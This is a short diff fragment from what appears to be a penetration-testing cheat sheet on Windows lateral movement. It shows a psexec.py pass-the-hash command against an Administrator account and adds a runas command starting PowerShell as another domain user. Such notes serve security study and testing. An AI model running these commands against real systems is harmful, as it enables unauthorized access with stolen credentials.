@@ -23,3 +23,7 @@ python psexec.py -hashes 00000000000000000000000000000000:<NTLM> Administrator@1
 
 ```
 [HINT](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/)
+## runas
+```
+runas /user:corp.com\robert powershell.exe
+```
